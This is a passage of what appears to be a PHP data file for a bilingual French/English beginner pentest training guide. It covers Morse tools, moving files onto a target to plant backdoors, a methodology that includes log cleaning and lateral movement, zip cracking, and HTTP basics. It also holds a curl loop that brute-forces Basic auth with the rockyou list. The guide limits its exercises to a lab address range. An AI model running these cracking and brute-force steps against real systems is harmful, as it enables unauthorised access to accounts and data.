return alphabet_morse[e.toLowerCase()] || \'\'; // Lowercase only, ignore unknown characters.
})
.join(\' \')            // Convert the array back to a string.
/*.replace(/ +/g, \' \'); // Replace double spaces that may occur when unknow characters were in the source string.*/
return morse;
}
function onMorseEncode(){
document.getElementById(\'MorseEncodeOut\').value = stringToMorse(document.getElementById(\'MorseEncodeIn\').value);
}
</script>
</div>
<div class=\'\'>

<div class=\'form-group text-left row\'>
<label  for=\'usr\' class=\'col-12\'>Text to decode</label>
<textarea id=\'MorseDecodeIn\' rows = \'5\' class=\'col-5\' name = \'description\' onKeyUp=\'onMorseDecode()\' onChange=\'onMorseDecode()\'></textarea>
<textarea readonly id=\'MorseDecodeOut\' rows = \'5\' class=\'col-5\' name = \'description\'></textarea>
</div>

<script>
var MORSE_CODE = {\'.-\': \'a\', \'-...\':\'b\', \'-.-.\': \'c\', \'-..\': \'d\', \'.\':\'e\', \'..-.\':\'f\', \'--.\':\'g\', \'....\':\'h\', \'..\':\'i\', \'.---\':\'j\', \'-.-\':\'k\', \'.-..\':\'l\', \'--\':\'m\', \'-.\':\'n\', \'---\':\'o\', \'.--.\':\'p\', \'--.-\':\'q\', \'.-.\':\'r\', \'...\':\'s\', \'-\':\'t\', \'..-\':\'u\', \'...-\':\'v\', \'.--\':\'w\', \'-..-\':\'x\', \'-.--\':\'y\', \'--..\':\'z\', \'.----\':\'1\', \'..---\':\'2\', \'...--\':\'3\', \'....-\':\'4\', \'.....\':\'5\', \'-....\':\'6\', \'--...\':\'7\', \'---..\':\'8\', \'----.\':\'9\', \'-----\':\'0\', \'|\':\' \', \'..--.-\':\'_\'};

var decodeMorse = function(morseCode){
var words = (morseCode).split(\'  \');
var letters = words.map((w) => w.split(\' \'));
var decoded = [];

for(var i = 0; i < letters.length; i++){
decoded[i] = [];
for(var x = 0; x < letters[i].length; x++){
if(MORSE_CODE[letters[i][x]]){
decoded[i].push( MORSE_CODE[letters[i][x]].toUpperCase() );
}
}
}

return decoded.map(arr => arr.join(\'\')).join(\' \');
}
function onMorseDecode(){
document.getElementById(\'MorseDecodeOut\').value = decodeMorse(document.getElementById(\'MorseDecodeIn\').value);
}
</script>
</div>
<div>
Be careful, capital letters are lost during encoding.
</div>


',
  ),
  'transfert-intro' => 
  array (
    'category' => 'transfert',
    'id' => 'intro',
    'title' => 'Transferts de fichiers',
    'desc' => '## Transferts de fichiers


',
    'title_en' => 'File transferts',
    'desc_en' => '## File transferts


',
  ),
  'transfert-principe' => 
  array (
    'category' => 'transfert',
    'id' => 'principe',
    'title' => 'Principe',
    'desc' => '## Principe

Dès l\'instant ou vous arrivez à éxécuter des commandes sur votre cible, vous avez besoin de transférer des fichiers textes ou binaires. <br/>
Vous allez certainement downloader des fichiers pour les analyser, ou uploader des outils tel des backdoors ou des scripts d\'élévation de privilèges.

',
    'title_en' => 'Principle',
    'desc_en' => '## Principle

As soon as you get your initial foothold on the target server, your next step is to transfert text or binary files. <br/>
You\'ll probably download some target files and upload some tools such as backdoors or privilege escalation scripts...

',
  ),
  'transfert-base64' => 
  array (
    'category' => 'transfert',
    'id' => 'base64',
    'title' => 'Copier/Coller en Base64',
    'desc' => '## Copier/Coller en Base64

Un encodage en base64 permet de faire des copier/coller de fichiers sans se soucier du binaire ou des retours à la ligne
```
cat file | base64
printf \'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\' | base64 -d > file
```

Préparez la dernière commande dans votre terminal, elle peut être assez longue, puis copiez/collez là dans votre cible.

',
    'title_en' => 'Base64 Copy/Paste',
    'desc_en' => '## Base64 Copy/Paste

Base64 encoding is the simplest way to upload small binary or text files.
```
cat file | base64
printf \'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\' | base64 -d > file
```

Just prepare the last command on you xterm, it can be many lines long, then copy/paste/exec on you target.

',
  ),
  'transfert-http' => 
  array (
    'category' => 'transfert',
    'id' => 'http',
    'title' => 'Transfert de fichier en lançant un serveur HTTP Server',
    'desc' => '## Transfert de fichier en lançant un serveur HTTP Server

Pour transférer un fichier sans se soucier de sa taille, lancer un serveur HTTP et faire un wget, curl
```
python -m SimpleHTTPServer 8000
php -S 0.0.0.0:8000
```

Attention, ce nouveau serveur permet à tout le monde de lire l\'intégralité de son système de fichier.

',
    'title_en' => 'File transfert with HTTP Server',
    'desc_en' => '## File transfert with HTTP Server

To transfer a file without worrying about its size, just launch an HTTP server and make a wget, curl
```
python -m SimpleHTTPServer 8000
php -S 0.0.0.0:8000
```

Be carefull, eveyone is able to browse this new server file system.

',
  ),
  'Forensic-intro' => 
  array (
    'category' => 'Forensic',
    'id' => 'intro',
    'title' => 'Forensic',
    'desc' => '## Forensic


',
    'title_en' => 'Forensic',
    'desc_en' => '## Forensic


',
  ),
  'Forensic-zip' => 
  array (
    'category' => 'Forensic',
    'id' => 'zip',
    'title' => 'Zip chiffré',
    'desc' => '## Zip chiffré

Cracker un zip chiffré avec une liste de mots de passe
````
fcrackzip -u -v -D -p rockyou.txt secret.zip
````

',
    'title_en' => 'Encrypted Zip',
    'desc_en' => '## Encrypted Zip

Brute force an encrypted zip with a list of passwords
````
fcrackzip -u -v -D -p rockyou.txt secret.zip
````

',
  ),
  'Forensic-mdb' => 
  array (
    'category' => 'Forensic',
    'id' => 'mdb',
    'title' => 'Mdb - Microsoft Access Database',
    'desc' => '## Mdb - Microsoft Access Database

Vérification du format du fichier:
````
$ file backup.mdb
backup.mdb: Microsoft Access Database
````
Si besoin, installer les outils:
````
apt-get install mdbtools
````
Lister les tables, et les dumper.
````
mdb-tables backup.mdb
mdb-export backup.mdp  users passwd
````

',
    'title_en' => 'Mdb - Microsoft Access Database',
    'desc_en' => '## Mdb - Microsoft Access Database

Check file format:
````
$ file backup.mdb
backup.mdb: Microsoft Access Database
````
If needed,install tools:
````
apt-get install mdbtools
````
List tables, then dump.
````
mdb-tables backup.mdb
mdb-export backup.mdp  users passwd
````

',
  ),
  'Forensic-pst' => 
  array (
    'category' => 'Forensic',
    'id' => 'pst',
    'title' => 'Pst - Outlook email file',
    'desc' => '## Pst - Outlook email file

Vérification du format du fichier:
````
$ file mails.pst
mails.pst: Microsoft Outlook email folder
````
Si besoin, installer les outils:
````
apt-get install pst-utils
````
Extraire les boites mails, et les lire.
````
readpst mails.pst
cat mails.mbox
````


',
    'title_en' => 'Pst - Outlook email file',
    'desc_en' => '## Pst - Outlook email file

Check file format:
````
$ file mails.pst
mails.pst: Microsoft Outlook email folder
````
If needed,install tools:
````
apt-get install pst-utils
````
Extract mailboxes, then read them.
````
readpst mails.pst
cat mails.mbox
````


',
  ),
  'HackersGuide-intro' => 
  array (
    'category' => 'HackersGuide',
    'id' => 'intro',
    'title' => 'Guide du Hacker',
    'desc' => '## Guide du Hacker


',
    'title_en' => 'Hacker\'s Guide',
    'desc_en' => '## Hacker\'s Guide


',
  ),
  'HackersGuide-Guide' => 
  array (
    'category' => 'HackersGuide',
    'id' => 'Guide',
    'title' => 'Intro',
    'desc' => '## Intro
Ce guide a pour but de simplifier la vie du débutant.
Il suit une méthodologie complète mais très simplifiée. Vous pourrez ainsi travailler sur vos premiers serveurs de niveaux faciles, et les powner sans vous perdre dans les méandres d\'Internet.
<br>
<br>


Les grandes phases d\'un pentest (test de pénétration) sont les suivantes:

___Définition du scope___
Définir clairement la cible, et les limites.
En formation, ce qui est notre cas, il s\'agit de serveurs sur une plage d\'adresse IP locale, non routable sur Internet.
Pour simplifier, vous ne devez travailler que sur des adresses qui commencent par 10. comme 10.10.0.10.
Nous ne ciblons jamais les infrastructures, ni nos collègues.


___Phase de reconnaissance___
Recueillir des données et des renseignements sur votre cible.
Les sources d’informations peuvent être sources externes accessibles à tous comme les moteurs de recherche, les réseaux sociaux et le DNS (Domain Name Service) ou des informations fournies par le client.
Bases Internet: Recherches sur Google, dns,...

___Phase de cartographie et énumération___
Identifier les serveurs, les ports ouverts et les services accessibles.
Bases en réseau: IP, port, services HTTP, ftp, smtp,...
[-> IP](?cat=Network)
[-> Découverte de réseau](?cat=NetworkDiscovery)
[-> HTTP](?cat=HTTP)

___Recherche de vulnérabilité___
Identifier des vulnérabilités connues en utilisant les versions des logiciels et des bases de données de logiciels vulnérables comme exploit_db, ou rechercher soi même des vulnérabilités basées sur le Top 10 OWASP.
Base : CVE, et idéalement python, sql,... pour comprendre l\'exploit et l\'adapter.
[-> CVE](?id=cve)
[-> Default Password and patterns](?cat=Password)
[-> LFI](?cat=lfi)
[-> Command injection](?cat=cmdinjection)
[-> SQLi](?cat=sqli)


___Exploitation___
Mise en application d\'un exploit de manière à pouvoir lancer des commandes shell sur un serveur.
[-> Webshells](?cat=Webshell)

___Elévation de privilèges___
Passer d\'un compte disposant de faibles privilèges, comme un serveur web, à un compte administrateur.
Base en shell: cd, système de fichiers, droits utilisateurs, fichier de config, sbit, sudo, ...
[-> Commandes shell](?cat=Shell)
[-> Transfert de fichiers](?cat=transfert)
[-> Elévation de privilège sur Linux](?cat=PrivEscUx)

___Maintient de l\'accès et nettoyage___
Mise en place de backdoor et nettoyage des traces pour pouvoir se reconnecter facilement sur le serveur.
Cette manoeuvre est considérée comme avancée.
Bases: systèmes de logs

___Déplacement latéral___
Utiliser le serveur pour rebondir sur d\'autres machines éventuellement situées sur d\'autres réseaux internes.
Cette manoeuvre est considérée comme avancée.
Bases: tunnelling et redirection de ports


Bon hacks !


',
    'title_en' => 'Intro',
    'desc_en' => '## Intro
This guide aims to simplify the life of the beginner.
It follows a complete but very simplified methodology. You will thus be able to work on your first servers of easy levels, and pown them without getting lost in the meanders of the Internet.
<br>
<br>


The main phases of a pentest (penetration test) are as follows:

___Definition of the scope___
Clearly define the target, and the limits.
In training, which is our case, these are servers on a local IP address range, not routable on the Internet.
To simplify, you should only work on addresses that start with 10. such as 10.10.0.10.
We never target infrastructures, nor our colleagues.


___Recognition phase___
Gather data and information on your target.
Sources of information can be external sources accessible to all, such as search engines, social networks and DNS (Domain Name Service) or information provided by the client.
Internet databases: Google searches, dns,...

___Mapping phase and enumeration___
Identify servers, open ports and accessible services.
Network knowledge: IP, port, HTTP, ftp, smtp,...
[-> IP](?cat=Network)
[-> Network Discovery](?cat=NetworkDiscovery)
[-> HTTP](?cat=HTTP)

___Vulnerability research___ ___Vulnerability research___ ___Vulnerability research___ ___Vulnerability research
Identify known vulnerabilities by using software and database versions of vulnerable software such as exploit_db, or search for vulnerabilities based on the OWASP Top 10.
Knowledge: CVE, and ideally python, sql,... to understand the exploit and adapt it.
[-> CVE](?id=cve)
[-> Default Password and patterns](?cat=Password)
[-> LFI](?cat=lfi)
[-> Command injection](?cat=cmdinjection)
[-> SQLi](?cat=sqli)


___Exploitation___
Implementation of an exploit so that shell commands can be run on a server.
[-> Webshells](?cat=Webshell)

___Privileges Elevation___
Switch from an account with low privileges, such as a web server, to an administrator account.
Shell knowledge: cd, file system, user rights, config file, sbit, sudo, ...
[-> Shell commands](?cat=Shell)
[-> File transfer](?cat=transfert)
[-> Privilege elevation on Linux](?cat=PrivEscUx)

___Maintaining Access and Cleaning___
Backdoor installation and cleaning of traces to be able to easily reconnect to the server.
This is not beginner stuff.
Knowledge: log systems

___Lateral Move___
Use the server to bounce to other machines that may be located on other internal networks.
This is not beginner stuff.
Knowledge: tunnelling and port forwarding

Have fun !


',
  ),
  'HTTP-intro' => 
  array (
    'category' => 'HTTP',
    'id' => 'intro',
    'title' => 'HTTP',
    'desc' => '## HTTP

Un serveur web tourne sur le serveur cible.<br/>
<br/>
Vous écrivez une URL dans votre navigateur pour spécifier la page que vous voulez obtenir.<br/>
Votre navigateur web encode l\'URL et l\'envoie au serveur en utilisant le protocole HTTP.<br/>
Le serveur renvoye une page affichable décrite en HTML grace au protocole HTTP.<br/>
<br/>
HTTP est un protocole riche qui permet de négocier des options et échanger des données.<br/>
Notamment des cookies sont utilisés pour garder des informations entre deux sessions.<br/>
Pour les lires et les modifiers, nous utilisons un proxy HTTP.<br/>
<br/>
https://fr.wikipedia.org/wiki/Hypertext_Transfer_Protocol

',
    'title_en' => 'HTTP',
    'desc_en' => '## HTTP

A web server is running on the target server.<br/>
<br/>
You enter an URL in your browser to specify the page you want to get.<br/>
Your web browser encodes the URL and sends it to the server using the HTTP protocol.<br/>
The server returns a displayable page described in HTML using the HTTP protocol.<br/>
<br/>
HTTP is a rich protocol, able to negotiate options and exchange data.<br/>
In particular, cookies are used to store information between two sessions.<br/>
HTTP request sand responses can be intercepted, modified and resent thanks to an HTTP proxy.
<br/>
https://fr.wikipedia.org/wiki/Hypertext_Transfer_Protocol

',
  ),
  'HTTP-HTTP0.9' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTP0.9',
    'title' => 'HTTP 0.9',
    'desc' => '## HTTP 0.9

Le protocole HTTP est utilisé par les navigateurs web pour obtenir des documents hébergés par les serveurs.<br/>
Le navigateur se connecte en TCP à un serveur, sur le port 80 par défaut.<br/>
La requête minimale contient une commande (ici GET), une URL (/hello.txt), une ligne vide.
```
GET /hello.txt

```

La réponse contient directement le fichier.
```
Hello world
```


```
$ printf \'GET /hello.txt \\n\\r\\n\' | nc localhost 8001
```


',
    'title_en' => 'HTTP 0.9',
    'desc_en' => '## HTTP 0.9

The HTTP protocol is used by web browsers to obtain documents hosted by servers.<br/>
The browser connects to a server via TCP, on port 80 by default.
The minimal request contains a command (here GET), a URL (/hello.txt), an empty line.
```
GET /hello.txt

```

The answer contains the requested file.
```
Hello world
```


```
$ printf \'GET /hello.txt \\n\\r\\n\' | nc localhost 8001
```


',
  ),
  'HTTP-HTTP1.1' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTP1.1',
    'title' => 'HTTP 1.1',
    'desc' => '## HTTP 1.1

La version 1.1 du protocole HTTP est optimisée pour transférer des pages HTML complexes, et permet de négocier la langue et les formats d\'encodages.<br/>
La requête minimale contient une commande (GET), une url (/hello.txt), la version (HTTP/1.1), le champ Host, une ligne vide.<br/>
```
GET /hello.txt HTTP/1.1
Host: 10.10.10.11 80

```


La réponse contient une entête composée de nombreux champs (server, date,...), la longueur du contenu (13), et le contenu sous forme de texte.<br/>
```
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/2.7.15+
Date: Thu, 26 Dec 2019 17:06:12 GMT
Content-type: text/html; charset=UTF-8
Content-Length: 13

Hello world

```


Les headers de la réponse sont des mines d\'information sur le serveur, sa version...<br/>
Ici un serveur Apache en version 0.8.4 qui éxécute des scripts avec un interpréteur php en version 7.3.13.
```
HTTP/1.1 200 OK
Server: Apache/0.8.4
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/7.3.13
```


```
$ printf \'GET / HTTP/1.1\\r\\nHost: localhost 8001\\r\\n\\r\\n\' | nc localhost 8001
```


',
    'title_en' => 'HTTP 1.1',
    'desc_en' => '## HTTP 1.1

HTTP protocol version 1.1 is optimized for complex HTML pages transferring, and allows negotiation of language and encoding formats.<br/>
The minimal request contains a command (GET), a url (/hello.txt), the version (HTTP/1.1), the Host field, an empty line.<br/>```
GET /hello.txt HTTP/1.1
Host: 10.10.10.11 80

```


The answer contains a header, composed of many fields (server, date,...), the length of the content (here 13), and the content as text.<br/>
```
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/2.7.15+
Date: Thu, 26 Dec 2019 17:06:12 GMT
Content-type: text/html; charset=UTF-8
Content-Length: 13

Hello world

```


The headers of the answer contains lots of usefull information about the server, its version...<br/>
Here is an Apache server in version 0.8.4 that runs scripts with a php interpreter in version 7.3.13.
```
HTTP/1.1 200 OK
Server: Apache/0.8.4
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/7.3.13
```


```
$ printf \'GET / HTTP/1.1\\r\\nHost: localhost 8001\\r\\n\\r\\n\' | nc localhost 8001
```


',
  ),
  'HTTP-HTTPCodes' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTPCodes',
    'title' => 'HTTP Codes',
    'desc' => '## HTTP Codes

Code de réponse HTTP
```
1xx informational response – the request was received, continuing process
2xx successful – the request was successfully received, understood, and accepted
200 OK
3xx redirection – further action needs to be taken in order to complete the request
301 Moved Permanently => Redirection
304 Not Modified
4xx client error – the request contains bad syntax or cannot be fulfilled
400 Bad request
401 Unauthorized
403 Forbidden
404 Not found
5xx server error – the server failed to fulfil an apparently valid request
500 Internal Server Error
502 Bad Gateway - The server was acting as a gateway or proxy and received an invalid response from the upstream server
503 Service Unavailable - The server cannot handle the request (because it is overloaded or down for maintenance)
504 Gateway Timeout - The server was acting as a gateway or proxy and did not receive a timely response from the upstream server.
https://en.wikipedia.org/wiki/List_of_HTTP_status_codes
```


',
    'title_en' => 'HTTP Codes',
    'desc_en' => '## HTTP Codes

HTTP response codes
```
1xx informational response – the request was received, continuing process
2xx successful – the request was successfully received, understood, and accepted
200 OK
3xx redirection – further action needs to be taken in order to complete the request
301 Moved Permanently => Redirection
304 Not Modified
4xx client error – the request contains bad syntax or cannot be fulfilled
400 Bad request
401 Unauthorized
403 Forbidden
404 Not found
5xx server error – the server failed to fulfil an apparently valid request
500 Internal Server Error
502 Bad Gateway - The server was acting as a gateway or proxy and received an invalid response from the upstream server
503 Service Unavailable - The server cannot handle the request (because it is overloaded or down for maintenance)
504 Gateway Timeout - The server was acting as a gateway or proxy and did not receive a timely response from the upstream server.
https://en.wikipedia.org/wiki/List_of_HTTP_status_codes
```


',
  ),
  'HTTP-HTTPCurlWget' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTPCurlWget',
    'title' => 'Curl et Wget',
    'desc' => '## Curl et Wget

Télécharger un fichier :
```
$ wget http://localhost:8001/
```

Afficher le contenu de la réponse :
```
$ curl http://localhost:8001/
```

Afficher les headers, la requête et le contenu de la réponse :
```
$ curl -v http://localhost:8001/
```


',
    'title_en' => 'Curl and Wget',
    'desc_en' => '## Curl and Wget

Download a file :
```
$ wget http://localhost:8001/
```

Print the content of the file :
```
$ curl http://localhost:8001/
```

Print the HTTP headers and the content of the file  :
```
$ curl -v http://localhost:8001/
```


',
  ),
  'HTTP-HTTPHeader' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTPHeader',
    'title' => 'HTTP: Entêtes',
    'desc' => '## HTTP: Entêtes

Les headers HTTP sont standardisés et sont riches en information.<br/>
- Host: Précise le site web destinataire de la requète.<br/>
- Referer: Adresse de la page web qui a généré la requète.<br/>
- User-Agent: Navigateur utilisé pour se connecter.

Il est possible d\'ajouter des headers personnels, tel \'X-MyHeader: value\'
```
GET / HTTP/1.1
Host: localhost:8001
User-Agent: curl/7.58.0
Accept: */*
X-MyHeader: value

```



Pour ajouter un header avec curl : -H \'header: valeur\'
```
$ curl -H \'X-MyHeader: value\' http://localhost:8001
```


',
    'title_en' => 'HTTP Headers',
    'desc_en' => '## HTTP Headers

HTTP headers are standardized and contain usefull informations.<br/>
- Host: the target of the request.
- Referer: Address of the web page that generated the query.<br/>
- User-Agent: Browser used to log in. <br/>

Custom headers can be freely added. Here \'X-MyHeader: value\':
```
GET / HTTP/1.1
Host: localhost:8001
User-Agent: curl/7.58.0
Accept: */*
X-MyHeader: value

```



Add a custom Header with curl : -H \'header: value\'
```
$ curl -H \'X-MyHeader: yoloforpresident\' http://localhost:8001
```


',
  ),
  'HTTP-HTTPParam' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTPParam',
    'title' => 'HTTP Get: les paramètres',
    'desc' => '## HTTP Get: les paramètres

L\'URI permet de précider une ressource, et d\'ajouter des paramètres.<br/>
Le premier paramètre est identifié par un ?, les suivants par un &.<br/>
Si les paramètres contiennent des ? ou des &, ils sont encodés sous la forme %3F et %26. On parle de Percent (%) encoding.<br/>
https://fr.wikipedia.org/wiki/Percent-encoding<br/>

Exemple:
```
$ curl \'http://localhost:8001/register.php?name=jean&lastname=bon&age=42&admin=true\'
```

Le shell unix utilisant le & pour lancer des taches en arrière plan, il est impératif de mettre l\'URL entre \'.

',
    'title_en' => 'HTTP Get: parameters',
    'desc_en' => '## HTTP Get: parameters

An URI (Universal Resource Locator) specify an internet resource, followed by optional parameters.<br/>
The first parameter is identified by a ?, the following ones by a &.<br/>.
If the parameters contain a ? or a &, they are encoded as %3F and %26. This is called Percent (%) encoding.<br/>.https://fr.wikipedia.org/wiki/Percent-encoding<br/>

Exemple:
```
$ curl \'http://localhost:8001/register.php?name=jean&lastname=bon&age=42&admin=true\'
```

As unix shell uses the & to launch background tasks, it is imperative to put the URL between quotes \'.

',
  ),
  'HTTP-HTTPFormAuthSimple' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTPFormAuthSimple',
    'title' => 'HTTP Authentification Basic',
    'desc' => '## HTTP Authentification Basic

HTTP dispose d\'une fonctionnalité d\'authentification basique. Il est possible ajouter un champ contenant un identifiant et un mot de passe en clair.<br/>
Ces informations sont mise sous la forme login:password, puis encodées en base64, et ajoutées dans l\'entête de la requête:<br/>
Authorization: Basic bG9naW46cGFzc3dvcmQ=<br/>
<br/>
Exemple:
```
GET /hello.txt HTTP/1.1
Host: localhost:8001
Authorization: Basic bG9naW46cGFzc3dvcmQ=
User-Agent: curl/7.58.0
Accept: */*

```


Pour envoyer une requête avec des informations d\'authentification avec curl:
```
$ curl -u login:password http://localhost:8001/hello.txt
```


Pour encoder un login:password dans le terminal
```
$ printf \'login:password\' | base64
bG9naW46cGFzc3dvcmQ=
```

Pour décoder du base64 dans le terminal
```
$ printf \'bG9naW46cGFzc3dvcmQ=\' | base64 -d
login:password
```


Pour tester une liste de mots de passe:
```
for i in `cat rockyou.txt`; do printf \\n$i:; curl  -u admin:$i http://12.10.1.11/training-http-auth-simple.php; done
```


',
    'title_en' => 'HTTP Authentification Basic',
    'desc_en' => '## HTTP Authentification Basic

HTTP has basic authentication feature, based on a field containing a username and a password in clear text.<br/>
login:password is base64 encoded then added in the request header.<br/>
Authorization: Basic bG9naW46cGFzc3dvcmQ=<br/>
<br/>
Exemple:
```
GET /hello.txt HTTP/1.1
Host: localhost:8001
Authorization: Basic bG9naW46cGFzc3dvcmQ=
User-Agent: curl/7.58.0
Accept: */*

```


Basic auth with curl:
```
$ curl -u login:password http://localhost:8001/hello.txt
```


Base64 encode login:password in shell
```
$ printf \'login:password\' | base64
bG9naW46cGFzc3dvcmQ=
```

Base64 decode
```
$ printf \'bG9naW46cGFzc3dvcmQ=\' | base64 -d
login:password
```


Bruteforce Basic auth with curl and rockyou password list:
```
for i in `cat rockyou.txt`; do printf \\n$i:; curl  -u admin:$i http://12.10.1.11/training-http-auth-simple.php; done
```


',
  ),
  'HTTP-HTTPFormPost' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTPFormPost',
    'title' => 'FORM: méthode Post',
    'desc' => '## FORM: méthode Post

Quand une page web comporte un formulaire, elle peut envoyer le contenu des champs avec la méthode GET dans les paramètres de l\'URL, ou avec la méthode POST dans le corps de la requète.<br/>
<br/>
Les valeurs en paramètres du GET apparaissent dans les logs, et sont limités en longueur.<br/>
Les valeurs en paramètres du POST n\'apparaissent pas dans les logs, et ne sont pas limités en longueur. Il est ainsi possible d\'uploader de gros fichiers.<br/>
Ces paramètres sont encodés avec le format \'Percent encoding\'.<br/>
Exemple:
```
POST /login.php HTTP/1.1
Host: 10.10.1.11
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

login=James&password=007
```


Poster un formulaire avec curl:
```
$ curl -X POST -F \'username=admin\' -F \'password=megapassword\'  http://localhost:8001/
```


',
    'title_en' => 'FORM: POST method',
    'desc_en' => '## FORM: POST method

Web pages send Form fields either using GET method in the URL parameters, or POST method in the request body.<br/>
<br/>
Parameter of GET requests are saved in logs files, and have limited length.<br/>
Parameter of POST requests do not appear in the logs, and are not limited in length. It is thus possible to upload large files.<br/>
These parameters are encoded with \'Percent encoding\'.<br/>
Example:
```
POST /login.php HTTP/1.1
Host: 10.10.1.11
Content-Type: application/x-wwww-form-urlencoded
Content-Length: 24

login=James&password=007
```

Post a form with curl:
```
$ curl -X POST -F \'username=admin\' -F \'password=megapassword\'  http://localhost:8001/
```


',
  ),
  'HTTP-HTTPFormPostHTML' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTPFormPostHTML',
    'title' => 'FORM: Trouver les champs du formulaire dans le code HTML',
    'desc' => '## FORM: Trouver les champs du formulaire dans le code HTML

Les formulaires sont des objets HTML de base, définis par les balises &lt;form> et &lt;/form><br/>
&lt;input name=\'xxx\'>: Nom des champs de type texte. <br/>
&lt;form action=\'xxx\': URL a laquelle sera envoyé le formulaire. Si le champ est vide, le formulaire est envoyé à la URL.<br/>
Exemple:
```
&lt;form action=&quot;/action_page.php&quot;&gt;
First name: &lt;input type=&quot;text&quot; name=&quot;firstname&quot; value=&quot;Mickey&quot;&gt
Last name:  &lt;input type=&quot;text&quot; name=&quot;lastname&quot; value=&quot;Mouse&quot;&gt;
&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;
&lt;/form&gt;
```


Poster un formulaire avec curl:
```
$ curl -X POST -F \'firstname=Mickey\' -F \'lastname=Mouse\'  http://12.10.1.11/action_page.php
```


',
    'title_en' => 'FORM: Identify Form fields in HTML pages',
    'desc_en' => '## FORM: Identify Form fields in HTML pages

Forms are HTML base objects, enclosed by &lt;form> and &lt;/form> tags.<br/>
&lt;input name=\'xxx\'>: Text input fields<br/>
&lt;form action=\'xxx\': URL to send the Form to. If empty send to the current URL.<br/>
Exemple:
```
&lt;form action=&quot;/action_page.php&quot;&gt;
First name: &lt;input type=&quot;text&quot; name=&quot;firstname&quot; value=&quot;Mickey&quot;&gt
Last name:  &lt;input type=&quot;text&quot; name=&quot;lastname&quot; value=&quot;Mouse&quot;&gt;
&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;
&lt;/form&gt;
```


Post a Form thanks curl:
```
$ curl -X POST -F \'firstname=Mickey\' -F \'lastname=Mouse\'  http://12.10.1.11/action_page.php
```


',
  ),
  'HTTP-HTTPFormGet' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTPFormGet',
    'title' => 'FORM: méthode Get',
    'desc' => '## FORM: méthode Get

Les pages web comportant des formulaires utilisent généralement la commande POST, mais elles peuvent aussi utiliser une commande GET.<br/>
Dans ce cas, la valeur des paramètres sont directement passés comme argument dans la requète.<br/>
Ne pas oublier de mettre l\'url entre \'cotes\'<br/>
Exemple:
```
$ curl \'http://localhost:8001/register.php?name=jean&lastname=bon&age=42&admin=true\'
```


',
    'title_en' => 'FORM: Get method',
    'desc_en' => '## FORM: Get method

HTML Forms most often use the POST method, sometime also the GET method is used.<br/>
Paramètres are sent as request URI arguments.<br/>
When using curl in shell, dont forget to use quotes \'<br/>
Exemple:
```
$ curl \'http://localhost:8001/register.php?name=jean&lastname=bon&age=42&admin=true\'
```


',
  ),
  'HTTP-HTTPFormPostJSon' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTPFormPostJSon',
    'title' => 'FORM: données au format JSON',
    'desc' => '## FORM: données au format JSON

Dans les formulaires élaborés, les données sont validées en Java Script avant d\'être envoyées, au bon format au serveur.<br/>
JavaScript utilise nativement le format JSON pour envoyer des structures de données structurées.<br/>
Exemple: {key1:value1, key2:value2}.<br/>
Dans ce cas, l\'entête Content-Type précise le type de données: Content-Type: application/json<br/>

Exemple:
```
POST / HTTP/1.1
Host: localhost:8001
User-Agent: curl/7.58.0
Accept: */*
Content-Type: application/json
Content-Length: 34

{&quot;key1&quot;:&quot;value1&quot;, &quot;key2&quot;:&quot;value2&quot;}
```


Curl :
```
$ curl --header &quot;Content-Type: application/json&quot; -X POST --data  \'{&quot;key1&quot;:&quot;value1&quot;, &quot;key2&quot;:&quot;value2&quot;}\' http://10.10.1.11/
```


',
    'title_en' => 'FORM: JSON format',
    'desc_en' => '## FORM: JSON format

It\'s common to procces form fields values in JavaScript before sending them to the server.<br/>
JavaScript natively makes use of JSon format to exchange structured datas.<br/>
Exemple: {key1:value1, key2:value2}.<br/>
The Content-Type header is then set to json: Content-Type: application/json<br/>

Exemple:
```
POST / HTTP/1.1
Host: localhost:8001
User-Agent: curl/7.58.0
Accept: */*
Content-Type: application/json
Content-Length: 34

{&quot;key1&quot;:&quot;value1&quot;, &quot;key2&quot;:&quot;value2&quot;}
```


Curl:
```
$ curl --header &quot;Content-Type: application/json&quot; -X POST --data  \'{&quot;key1&quot;:&quot;value1&quot;, &quot;key2&quot;:&quot;value2&quot;}\' http://10.10.1.11/
```


',
  ),
  'HTTP-HTTPFormPostFile' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTPFormPostFile',
    'title' => 'FILE: Upload',
    'desc' => '## FILE: Upload

Les formulaires sont généralement utilisés pour s\'enregister, se connecter ou d\'uploader des fichiers.<br/>
Des contrôles sur les fichiers uploadés peuvent être fait en javascript sur le client, ou sur le serveur.<br/>
On vérifie souvent la taille, le nom, l\'extension du fichier, et parfois son header.<br/>
Un chapitre entier du guide est dédié à l\'upload de nos shells.<br/>
<br/>
Un champ de type Fichier est caractérisé par le code HTML
```
&lt;input type=file name=fileToUpload>:
```

Commande curl
```
curl -X POST -F \'fileToUpload=@./picture.jpg\' http://10.10.1.11/upload
```


',
    'title_en' => 'FILE: Upload',
    'desc_en' => '## FILE: Upload

Forms are often used to register, login, and upload files.<br/>
Lots of sanity checks can be done in JavaScript in the browser before the upload or on the server after the upload.<br/>
Filename and file extension, are often checked, sometime even the file header is chekced to verify wether it\'s an image or a php file.<br/>
A full chapter is dedicated to file upload and filter bypass.<br/>
<br/>
A File field can be identified by the following HTML code
```
&lt;input type=file name=fileToUpload>:
```

Curl command
```
curl -X POST -F \'fileToUpload=@./picture.jpg\' http://10.10.1.11/upload
```


',
  ),
  'HTTP-HTTPFormCookies' => 
  array (
